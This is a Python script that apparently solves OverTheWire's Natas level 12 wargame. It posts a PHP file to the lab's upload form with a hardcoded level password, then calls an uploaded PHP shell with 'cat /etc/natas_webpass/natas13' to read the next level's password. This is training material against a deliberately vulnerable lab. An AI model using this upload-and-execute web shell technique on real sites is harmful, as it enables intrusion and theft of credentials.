#!  usr/bin/env python
import requests
import urllib
import base64
username="natas12"
password="EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()
files = {'uploadedfile' : ('file.php' , open('/home/tw3/Desktop/overthewire/natas/source_second_natas12.php','rb'))}
data= { 'filename' : 'file.php' , "MAX_FILE_SIZE" : '1000'}
# response = session.post(url , data = data,auth = (username , password) , files = files)
# print session.headers
# response.set_cookie(cook)
response = session.post(url+'upload/sem2bw8871.php?c=cat /etc/natas_webpass/natas13'  , data = data,auth = (username , password) , files = files)
# print ("\n")
# print (response.cookies.get_dict())
# print session.cookies["data"]

# print	 urllib.unquote(session.cookies["data"])
print (response.text)

